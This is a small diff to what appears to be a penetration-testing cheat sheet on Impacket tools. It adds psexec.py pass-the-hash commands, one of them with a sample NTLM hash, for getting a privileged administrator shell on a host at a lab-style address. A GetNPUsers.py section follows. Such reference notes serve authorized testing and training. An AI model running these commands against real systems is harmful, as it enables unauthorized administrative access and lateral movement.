@@ -61,7 +61,8 @@
 
 Use Impacket's `psexec.py` to gain a **privileged shell**
 
-    ./psexec.py administrator@10.10.10.4
+    $ psexec.py domain.local/administrator@10.10.10.4 -hashes <NTML hash>:<NTLM hash>
+    $ psexec.py domain.local/administrator@10.10.10.4 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
 
 ## GetNPUsers.py
 
